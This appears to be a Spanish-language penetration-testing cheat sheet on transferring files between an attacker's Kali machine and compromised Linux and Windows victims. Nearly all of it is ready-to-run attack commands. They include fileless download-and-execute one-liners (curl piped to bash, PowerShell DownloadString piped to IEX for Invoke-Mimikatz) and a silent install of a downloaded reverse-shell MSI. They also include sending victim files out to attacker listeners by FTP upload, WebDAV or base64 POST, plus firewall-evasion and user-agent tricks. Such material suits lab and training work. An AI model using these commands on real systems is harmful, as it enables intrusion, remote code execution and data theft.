# Linux
### Netcat

#Maquina_victima 
```
nc -lvp 4444 > [NOMBRE_ARCHIVO]
```

#Maquina_atacante
```
nc [IP_VICTIMA] 4444 < [NOMBRE_ARCHIVO]
```
(Si da un error ponemos un `-w 3` antes del puerto)
#### Para evadir firewalls
#Maquina_atacante 
```
nc -q 0 [IP_VICTIMA] 4444 < [NOMBRE_ARCHIVO]
```
El -q 0 hace que se cierre la conexión de `netcat` una vez finalizada la transmisión.

#Maquina_atacante 
```
ncat --send-only [IP_VICTIMA] 4444 < [NOMBRE_ARCHIVO]
```
Con esto hacemos que solo pueda enviar no recibir.

#Maquina_victima 
```
ncat -lvp 4444 --recv-only > [NOMBRE_ARCHIVO]
```
Con esto hacemos que solo pueda recibir no enviar.


### Wget

#Maquina_atacante
```
python3 -m http.server 80 
```

#Maquina_victima 
```
wget http://[IP_KALI]:80/[ARCHIVO]
```
### Curl

#Maquina_atacante
```
python3 -m http.server 80 
```

#Maquina_victima 
```
curl -o [ARCHIVO] http://[IP_KALI]:80/[ARCHIVO]
```

### SCP (A través de SSH)

#### Kali --> Victima
##### Con contraseña
#Maquina_atacante 
```
scp -P 22 [ARCHIVO] [USUARIO]@[IP_VICTIMA]:/tmp/
```
##### Con id_rsa
#Maquina_atacante 
```
scp -i id_rsa -P 22 [ARCHIVO] [USUARIO]@[IP_VICTIMA]:/tmp/
```

#### Victima --> Kali
##### Con contraseña
#Maquina_atacante
```
scp -P 22 [USUARIO]@[IP]:/[Ruta]/[AL]/[ARCHIVO] ./
```
`./` al final lo guarda en el directorio actual donde estamos
##### Con id_rsa
#Maquina_atacante
```
scp -i id_rsa -P 22 [USUARIO]@[IP]:/[Ruta]/[AL]/[ARCHIVO] ./
```
### twistd3 (A través de FTP)

#Maquina_atacante
```
twistd3 -n ftp -r . -p 21
```

#Maquina_victima 
```
wget ftp://[IP_ATACANTE]/[ARCHIVO]
```
U otra manera:
```
ftp [IP_ATACANTE]
```

### Bash
#Maquina_atacante
```
python3 -m http.server 80 
```

#Maquina_victima 
```
exec 3<>/dev/tcp/10.10.10.32/80

echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

cat <&3
```



# Windows
![[Pasted image 20250815002022.png]]
## SMB
#### Kali --> Victima
#Maquina_atacante 
```
mkdir -p /tmp/smbshare

sudo impacket-smbserver share -smb2support /tmp/smbshare
```

#Maquina_victima_Windows 
```CMD
copy \\[IP_KALI]\share\nc.exe
```

Si nos da el error:
#Maquina_atacante 
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

#Maquina_victima_Windows 
```CMD
net use n: \\192.168.220.133\share /user:test test
```

#### Victima --> Kali
Aquí hacemos uso de que algunas maquinas tienen el puerto 445 bloqueado por seguridad y que los 80/443 de web están activos por comodidad entonces usamos WebDAV que es una extension del protocolo HTTP que ahce como SMB

#Maquina_atacante 
```
sudo pip3 install wsgidav cheroot

sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
Cualquier archivo que copies desde Windows a `\\IP\DavWWWRoot` se guardará en `/tmp` del atacante.
Si necesitamos HTTPS pondremos el puerto 443

#Maquina_victima_Windows 
```CMD
dir \\[IP_KALI]\DavWWWRoot
```
 `DavWWWRoot` es una palabra clave especial reconocida por el shell de Windows. Nos conecta a la raiz del servidor WebDAV. Si queremos acceder a una carpeta en especifico podemos usarla \IP_KALI\sharefolder, pero de normal usaremos el raiz.

Después lo subimos con:
```CMD
copy C:\RUTA\AL\ARCHIVO \\[IP_KALI]\DavWWWRoot\
```
## FTP

#### Kali --> Victima
#Maquina_atacante 
```
sudo pip3 install pyftpdlib

sudo python3 -m pyftpdlib --port 21
```

#Maquina_victima_Windows 
```PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

Al acceder a un shell en una máquina remota, es posible que no tengamos un shell interactivo. En ese caso, podemos crear un archivo de comandos FTP para descargar un archivo. Primero, necesitamos crear un archivo con los comandos que queremos ejecutar y luego usar el cliente FTP para descargarlo:
#Maquina_victima_Windows 
```CMD
echo open 192.168.49.128 > ftpcommand.txt

echo USER anonymous >> ftpcommand.txt

echo binary >> ftpcommand.txt

echo GET [ARCHIVO] >> ftpcommand.txt

echo bye >> ftpcommand.txt
```

Y lo ejecutamos:
#Maquina_victima_Windows 
```
ftp -v -n -s:ftpcommand.txt
```
Esto descargará el [ARCHIVO] que queremos.

#### Victima --> Kali
#Maquina_atacante 
```
sudo python3 -m pyftpdlib --port 21 --write
```

#Maquina_victima_Windows 
```PowerShell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

Al acceder a un shell en una máquina remota, es posible que no tengamos un shell interactivo. En ese caso, podemos crear un archivo de comandos FTP para descargar un archivo. Primero, necesitamos crear un archivo con los comandos que queremos ejecutar y luego usar el cliente FTP para descargarlo:
#Maquina_victima_Windows 
```CMD
echo open 192.168.49.128 > ftpcommand.txt

echo USER anonymous >> ftpcommand.txt

echo binary >> ftpcommand.txt

echo PUT c:\RUTA\AL\ARCHIVO >> ftpcommand.txt

echo bye >> ftpcommand.txt
```

Y lo ejecutamos:
#Maquina_victima_Windows 
```
ftp -v -n -s:ftpcommand.txt
```
Esto descargará el [ARCHIVO] que queremos.

## WinRM
Si tiene el puerto 5985 que pertenece a WinRM podemos hacer varias cosas.
Traspasar archivos fácilmente entre la Kali y la maquina:

#Maquina_atacante
Primero montamos nuestro sistema de carpetas compartido con cualquiera de estos dos comandos:
```
rdesktop [IP] -d [DOMINIO] -u [USUARIO] -p '[CONTRASEÑA]' -r disk:linux='/home/user/rdesktop/files'
```
O
```
xfreerdp /v:[IP] /d:[DOMINIO] /u:[USUARIO] /p:'[CONTRASEÑA]' /drive:linux,/home/user/rdesktop/files
```
Si no se usa dominio se puede quitar esta flag

#Maquina_victima_Windows 
Accedemos a esta carpeta desde un explorador de archivos y poniendo: `\\tsclient\`
Y ahí veremos la carpeta compartida.

## Con funciones Windows
### New-Object:

#### Kali --> Victima
#Maquina_atacante
```
python3 -m http.server 80 
```

#Maquina_victima_Windows
```CMD
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://[IP_KALI]:80/[ARCHIVO]','C:\\[RUTA]\\[DONE]\\[GUARDAR_EL_ARCHIVO.txt]')"
```
Esto lo ejecutamos en el CMD si lo vamos a hacer desde powershell le quitamos lo correspondiente: `powershell.exe -c ""`

Ejemplo:
```CMD
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.23.94.104:80/reverse.msi','C:\\Users\\CyberLens\\reverse.msi')"
```

Si es un archivo con extensión .msi:
Se ejecuta con : msiexec /quiet /qn /i C:\\Users\\CyberLens\\reverse.msi
#### Victima --> Kali
#Maquina_atacante 
```
pip3 install uploadserver

python3 -m uploadserver
```

#Maquina_victima_Windows 
```PowerShell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://[IP_KALI]:8000/upload -File C:\RUTA\AL\ARCHIVO
```
Esto lo que hace es descargar y ejecutar PSUpload.ps1 en memoria para después poder subir el archivo al server de python que hemos generado antes.
### Invoke-WebRequest
Si falla alguno puede ser por el user agent prueba a:

```PowerShell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
```
Prueba ahora en los comandos de mas abajo -UserAgent $UserAgent , despues de la IP con el archivo y antes del -Outfile
#### Kali --> Victima
#Maquina_victima_Windows 
```PowerShell
Invoke-WebRequest https://[IP]/PowerView.ps1 -OutFile PowerView.ps1
```

Puede haber casos en los que la configuración inicial de Internet Explorer no se haya completado, lo que impide la descarga, se soluciona con '-UseBasicParsing':
```PowerShell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing -OutFile PowerView.ps1
```
#### Victima --> Kali
#Maquina_atacante 
```
nc -lvnp 8000
```

#Maquina_victima_Windows 
```PowerShell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\RUTA\AL\ARCHIVO' -Encoding Byte))

Invoke-WebRequest -Uri http://[IP_KALI]:8000/ -Method POST -Body $b64
```

## Certutil
#Maquina_atacante
```
python3 -m http.server 80 
```

#Maquina_victima_Windows 
```CMD
certutil.exe -verifyctl -split -f http://[IP]:[PUERTO]/nc.exe
```

# Fileless Downloads Attacks
## En Linux
Si ponemos un pipe al final del comando y le añadimos su respectivo lenguaje.
Ejemplos:
```
curl https://[IP]/[ARCHIVO].sh | bash
```

```
wget -qO- https://[IP]/[ARCHIVO].py | python3
```

## En Windows:
Si ponemos un pipe al final del comando y le añadimos IEX
Ejemplo:
```PowerShell
(New-Object Net.WebClient).DownloadString('https://[IP]/Invoke-Mimikatz.ps1') | IEX
```


# Descargar archivos con diferentes lenguajes
## Pyhton

```
python2.7 -c 'import urllib;urllib.urlretrieve ("http://[IP]/LinEnum.sh", "LinEnum.sh")'
```

```
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://[IP]/LinEnum.sh", "LinEnum.sh")'
```

## PHP
```
php -r '$file = file_get_contents("http://[IP]/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

```
php -r 'const BUFFER = 1024; $fremote = 
fopen("http://[IP]/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

```
php -r '$lines = @file("http://[IP]/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Ruby
```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("http://[IP]/LinEnum.sh")))'
```

```
perl -e 'use LWP::Simple; getstore("http://[IP]/LinEnum.sh", "LinEnum.sh");'
```
